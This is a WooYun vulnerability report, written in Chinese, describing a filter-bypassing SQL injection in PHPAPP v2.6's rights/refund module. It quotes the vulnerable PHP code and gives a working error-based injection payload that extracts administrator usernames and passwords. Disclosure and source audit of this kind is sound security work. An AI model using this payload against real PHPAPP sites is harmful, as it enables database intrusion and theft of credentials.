{"id": 41385, "wybug_id": "wooyun-2014-089020", "wybug_title": "PHPAPP注入第十三枚（无视过滤）", "wybug_corp": "PHPAPP", "wybug_author": "路人甲", "wybug_date": "2014-12-31 10:42", "wybug_open_date": "2015-03-31 10:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-31：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-31：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPAPP注入第十三枚（无视过滤） 详细说明：  在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?action=1&app=42&cid=85&rid=973, 存在漏洞的文件在/phpapp/apps/rights/member_phpapp.php下面分析一下漏洞产生的原因第一处绕过：先看看是如何得到$_POST中的内容的，$this->POST=$this->POSTArray();如果key的最后一个字母是’_s’时，用户的输入会经过str方法的防注处理。而如果key（参数）的最后一个字母不是’_s’，则可以功能绕过过滤！第二处绕过:\nif($this->cid>0){\t\t\t\t\t$getprocess=new TaskProcess();\t\t\t\t\t$consumearr=$this->GetMysqlOne('a.*,b.oid,b.tid,b.buyeruid,b.selleruid,b.runid',\" \".$this->GetTable('consume').\" AS a JOIN \".$this->GetTable('task_order').\" AS b ON a.cid=b.cid  WHERE a.cid='$this->cid' AND a.process=5 AND b.buyeruid='$this->uid'\");\t\t\t\t\t//认证\t\t\t\t\t$selleruid=$consumearr['selleruid'];\t\t\t\t\t$issellersecurity=0;\t\t\t\t\tif($this->IsSQL('member_security_certificate',\" WHERE sid=1 AND uid='$selleruid' \")){\t\t\t\t\t\t $issellersecurity=1;\t\t\t\t\t}   \t\t\t\t\tif($this->rid>0){\t\t\t\t\t\t   $refund=$this->GetMysqlOne('*',\" \".$this->GetTable('rights').\" WHERE rid='$this->rid' AND buyeruid='$this->uid'\");\t\t\t\t\t}else{\t\t\t\t\t\t   $refund=$this->GetMysqlOne('*',\" \".$this->GetTable('rights').\" WHERE cid='$this->cid' AND buyeruid='$this->uid'\");\t\t\t\t\t\t   if($refund['rid']>0){\t\t\t\t\t\t\t\t $this->rid=$refund['rid'];\t\t\t\t\t\t   }\t\t\t\t\t}\t\t\t\t\tif($consumearr['cid']>0){\t\t\t\t\tif(true==true){\t\t\t\t\t\t   $sellerarr=$this->GetMysqlOne('uid,username',\" \".$this->GetTable('member').\" WHERE uid='$consumearr[selleruid]' \");\t\t\t\t\t\t   $buyerarr=$this->GetMysqlOne('uid,username',\" \".$this->GetTable('member').\" WHERE uid='$consumearr[buyeruid]' \");\t\t\t\t\t\t   if($this->uid!=$consumearr['buyeruid']){\t\t\t\t\t\t\t      $this->Refresh('对不起!您没有权限操作!',SURL.'/member.php?app='.$this->app.'&action=1');\t\t\t\t\t       }\t\t\t\t\t\t   //维权时间$rightsendtime=$consumearr['dateline']+intval(PHPAPP::$config['orders_rights_date'])*24*60*60;\t\t\t\t\t\t   if($this->POST['submit']){\t\t\t\t\t\t\t      if($this->IsSQL('rights',\"WHERE cid='$this->cid' AND process=3\")){\t\t\t\t\t\t\t\t\t\t$this->Refresh('该订单您已经申请维权并处理过了!',SURL.'/member.php?app='.$this->app.'&action=1');\t\t\t\t\t\t\t\t  }\t\t\t\t\t\t\t\t  if($rightsendtime > $this->NowTime()){\t\t\t\t\t\t\t\t\t\t\t$this->POST['content']=$this->str($this->POST['content'],0,0,0,1,0,0,1);\t\t\t\t\t\t\t\t\t\t\tinclude_once(Core.'/class/photo_upload_phpapp.php');\t\t\t\t\t\t\t\t\t\t if($_FILES['buyerphoto']['size']>0){\t\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t\t   $photoid=empty($refund['buyerphoto']) ? 0 : intval($refund['buyerphoto']);\t\t\t\t\t\t\t\t\t\t\t   $upload=new UploadPhoto($_FILES['buyerphoto'],$photoid);\t\t\t\t\t\t\t\t\t\t\t   $photoid=$upload->CheckUpload();\t\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t }else{\t\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t\t   if(!empty($refund['buyerphoto'])){\t\t\t\t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t\t\t\t $photoid=intval($refund['buyerphoto']);\t\t\t\t\t\t\t\t\t\t\t\t   }\t\t\t\t\t\t\t\t\t\t\t  \t\t\t\t\t\t\t\t\t\t }\t\t\t\t\t\t\t\t\t\t   $edittxt='';\t\t\t\t\t\t\t\t\t   if($this->rid>0){\t\t\t\t\t\t\t\t\t\t\t$edittxt='修改了';\t\t\t\t\t\t\t\t\t   }\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   if($this->rid>0){\t$this->Update('rights',$this->POST,array('dateline'=>$this->NowTime(),'buyeruid'=>$consumearr['buyeruid'],'selleruid'=>$consumearr['selleruid'],'tid'=>$consumearr['tid'],'cid'=>$consumearr['cid'],'oid'=>$consumearr['oid'],'buyerphoto'=>$photoid,'process'=>1),\" WHERE rid='$this->rid' AND buyeruid='$this->uid'\");\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   }\n看到了这句$this->Update('rights',$this->POST,array('dateline'=>$this->NowTime(),'buyeruid'=>$consumearr['buyeruid'],'selleruid'=>$consumearr['selleruid'],'tid'=>$consumearr['tid'],'cid'=>$consumearr['cid'],'oid'=>$consumearr['oid'],'buyerphoto'=>$photoid,'process'=>1),\" WHERE rid='$this->rid' AND buyeruid='$this->uid'\");把整个post的内容带入了Update方法，再去看看Update方法，/phpapp/apps/core/class/mysql_class_phpapp.php\n//表名, 修改数组,添加合并数组,条件\tfunction Update($tablename,$setarray=array(),$addarr=array(),$whereif=''){\t\t \t\t $setarray=array_merge($setarray,$addarr);\t\t \t\t $deletearr=$this->GetMysqlFieldArray($tablename);\t\t \t\t if($setarray){\t\t\t  $sqlset='';\t\t\t  foreach($setarray as $key=>$value){\t\t\t        $_key=strtolower($key);\t\t\t\t    if(isset($deletearr[$_key])){\t\t\t\t           $value=$this->dataTypeConvert($value,$deletearr[$_key]);\t\t\t\t    \t   if($sqlset){\t\t\t\t\t\t\t    $sqlset.=',`'.$_key.'`=\\''.$value.'\\'';\t\t\t\t\t\t   }else{\t\t\t\t\t\t\t    $sqlset='`'.$_key.'`=\\''.$value.'\\'';\t\t\t\t\t\t   }\t\t\t\t\t\t\t\t\t\t}\t\t\t  }\t\t\t  \t\t\t  $query=sprintf('UPDATE %s SET %s %s',$this->GetTable($tablename),$sqlset,$whereif);\t          //exit($query);\t\t\t  return $this->MysqlQuery($query);\t\t\t  \t\t }else{\t\t\t  return false;\t\t }\t      \t}\nUpdate代码防注分析：1、通过GetMysqlFieldArray方法获取数据表的所有字段名及每个字段对应的属性；2、判断用户post的内容中的key是否是数据表中的字段名，防止了key的注入；3、通过dataTypeConvert方法把用户提交的数据按数据表中各字段的类型进行防注转换。如果以上每一步的代码都正确实现了的话，应该是没有办法注入的，但是这里的第3步中，也就是dataTypeConvert方法的实现时有疏忽，看下面代码。\nfunction dataTypeConvert($data,$type){        switch($type){            case 'int':                $data=intval($data);                break;            case 'real':                $data=doubleval($data);                break;            case 'timestamp':                $data=intval($data);                break;            case 'string':            case 'year':            case 'date':            case 'time':            case 'datetime':            case 'blob':            default:                //$data=intval($data);                break;        }        return $data;    }\n只对int、real、timestamp做了处理，其他的类型这里没有处理。绕过方法：在提交http请求时，可以提交其他类型的参数，但其他参数必须是数据表（phpapp_rights）中的字段，且类型不是int、real、timestamp的参数。这里有多个参数可以注入。测试时请保证自己的账号有可以维权的订单，如果没有的话，（真实的网站肯定可以有订单）为了测试方便，把if($consumearr['cid']>0)和if($rightsendtime > $this->NowTime())改为if(true==true)且把 if($this->uid!=$consumearr['buyeruid'])改为if(1==2)下面以sellercontent为例进行证明：Phpapp可以显错，那就用error-based blind进行注入。Pyload：(POST提交)\nsubmit=111&content=111111&sellercontent=' or(select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(0x23,username,0x23,password) from phpapp_member limit 0,1))a from information_schema.tables group by a)b) or'\n注入成功，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  完善dataTypeConvert方法    版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}